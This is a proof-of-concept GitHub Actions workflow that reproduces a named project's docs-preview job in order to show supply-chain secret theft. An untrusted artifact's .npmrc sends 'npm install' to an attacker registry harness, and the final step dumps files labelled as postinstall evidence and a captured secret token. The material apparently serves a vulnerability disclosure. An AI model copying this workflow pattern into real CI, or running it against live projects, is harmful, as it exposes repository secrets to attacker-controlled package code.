# PoC: "Preview Fern Docs: Comment" consumer, mirroring NVIDIA/aicr
# .github/workflows/fern-docs-preview-comment.yml step-for-step.
#
# The only additions are the harness that stands in for the attacker-controlled
# npm registry and the final evidence dump.
name: "Preview Fern Docs: Comment"

on:
  workflow_run:
    workflows: ["Preview Fern Docs: Build"]
    types: [completed]

permissions:
  actions: read
  contents: read

jobs:
  preview:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    steps:
      - name: Download fern sources and metadata
        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: fern-preview
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}

      - name: Read PR metadata
        id: metadata
        run: |
          echo "pr_number=$(cat preview-metadata/pr_number)" >> "$GITHUB_OUTPUT"
          echo "head_ref=$(cat preview-metadata/head_ref)" >> "$GITHUB_OUTPUT"

      - name: Checkout base repo for trusted config
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          path: base
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: '20'

      - name: Inspect extracted workspace
        run: |
          echo "--- workspace root ---"; ls -la
          echo "--- npmrc ---"; cat .npmrc
          echo "--- project registry as seen by npm ---"; npm config get registry
          echo "--- metadata outputs --- pr=${{ steps.metadata.outputs.pr_number }} ref=${{ steps.metadata.outputs.head_ref }}"

      # Harness only: stands in for the attacker's remote registry/collector.
      - name: Start attacker registry harness
        run: |
          RUNNER_TRACKING_ID= setsid nohup python3 base/harness/registry.py > /tmp/registry.log 2>&1 < /dev/null &
          sleep 2
          curl -sS --max-time 5 http://127.0.0.1:8081/-/ping; echo

      - name: Install Fern CLI
        run: |
          set -euo pipefail
          VERSION=$(jq -r .version base/fern/fern.config.json)
          if ! [[ "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$ ]]; then
            echo "::error::base fern.config.json .version '$VERSION' is not a valid semver"
            exit 1
          fi
          npm install -g "fern-api@${VERSION}"
          echo "--- evidence after install ---"; cat /tmp/poc-evidence.txt || true

      - name: Generate preview URL
        id: generate-docs
        env:
          FERN_TOKEN: ${{ secrets.POC_FERN_TOKEN }}
          HEAD_REF: ${{ steps.metadata.outputs.head_ref }}
        working-directory: ./fern
        run: |
          set -o pipefail
          fern generate --docs --preview --id "$HEAD_REF" 2>&1 | tee /tmp/fern-output.log
          echo "fern step finished"

      - name: Evidence dump
        if: always()
        run: |
          echo "=== postinstall evidence ==="
          cat /tmp/poc-evidence.txt || true
          echo "=== secret captured by attacker code ==="
          cat /tmp/leaked.txt || true
          echo "=== registry harness log ==="
          cat /tmp/registry.log || true
